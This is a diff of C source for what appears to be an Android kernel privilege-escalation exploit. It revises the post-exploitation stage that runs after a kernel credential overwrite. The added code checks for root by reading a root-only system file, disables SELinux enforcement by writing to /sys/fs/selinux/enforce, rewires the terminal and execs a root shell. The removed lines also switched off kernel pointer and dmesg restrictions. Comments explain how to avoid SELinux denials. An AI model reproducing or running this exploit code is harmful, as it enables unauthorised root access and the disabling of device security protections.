@@ -1731,12 +1731,13 @@ static void safe_cred_patch(void)
     }
 
 shell:
-    gbuf[GBUF_TASK_SPRAY] = 0x2; // Signal parent
-    __sync_synchronize();
+    // IMPORTANT: Do NOT call setresuid here. We already have uid=0 in kernel.
+    // Calling setresuid in untrusted_app context with init_cred can trigger
+    // SELinux denials (init->untrusted_app reverse transition) and SIGSEGV.
+    // The cred patch already gave us root, just exec the shell directly.
 
-    // Explicitly confirm root state in child context before exec
-    setresuid(0, 0, 0);
-    setresgid(0, 0, 0);
+    gbuf[GBUF_TASK_SPRAY] = 0x2; // Signal parent FIRST so parent doesn't wait
+    __sync_synchronize();
 
     // Robust verification: Try to read /data/system/packages.list (Root only)
     int test_fd = open("/data/system/packages.list", O_RDONLY);
@@ -1750,36 +1751,42 @@ shell:
     fprintf(stderr, "[CHILD %d] [+] Executing root shell...\n", getpid());
     fprintf(stderr, "[CHILD %d] Verified identity: UID=%d GID=%d\n", getpid(), getuid(), getgid());
     fflush(stderr);
-    
+
     // Set environment for root
     setenv("PATH", "/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin:/data/local/tmp:/data/user/0/com.termux/files/usr/bin", 1);
     setenv("TERM", "xterm", 1);
     setenv("HOME", "/data/local/tmp", 1);
 
-    // Try to run id command via system first to show user
-    system("id");
-    
-    // NEW: Attempt to disable SELinux and other protections from child if we have root
-    fprintf(stderr, "[CHILD %d] Disabling Kernel Protections...\n", getpid());
-    system("setenforce 0 2>/dev/null");
-    system("echo 0 > /sys/fs/selinux/enforce 2>/dev/null");
-    system("echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null");
-    system("echo 0 > /proc/sys/kernel/dmesg_restrict 2>/dev/null");
-    system("setprop selinux.reload_policy 1 2>/dev/null");
-    system("getenforce");
+    // Try to disable SELinux BEFORE exec (so the new shell inherits permissive context)
+    if (getuid() == 0) {
+        // We are root, try to disable SELinux
+        FILE *f = fopen("/sys/fs/selinux/enforce", "w");
+        if (f) { fputs("0\n", f); fclose(f); }
+    }
 
-    // Try to escalate privileges via syscalls again just in case
-    prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
-    setresuid(0, 0, 0);
-    setresgid(0, 0, 0);
-    setuid(0);
-    setgid(0);
+    // Use execve directly with proper argv (no -i which can fail in some shells)
+    // Also redirect stdin/stdout/stderr to /dev/tty if available
+    int tty_fd = open("/dev/tty", O_RDWR);
+    if (tty_fd >= 0) {
+        dup2(tty_fd, 0);
+        dup2(tty_fd, 1);
+        dup2(tty_fd, 2);
+        if (tty_fd > 2) close(tty_fd);
+    }
 
-    // Use execl for a cleaner shell transition
-    execl("/system/bin/sh", "sh", "-i", NULL);
-    
-    // If execl fails, fallback to system
-    system("/system/bin/sh");
+    // Try a few shell paths in order
+    char *sh_paths[] = {
+        "/system/bin/sh",
+        "/vendor/bin/sh",
+        "/data/adb/modules/..." // placeholder
+    };
+    for (int i = 0; i < 2; i++) {
+        if (access(sh_paths[i], X_OK) == 0) {
+            execl(sh_paths[i], "sh", NULL);
+        }
+    }
+    // Last resort
+    execl("/system/bin/sh", "sh", NULL);
     exit(0);
 }
 
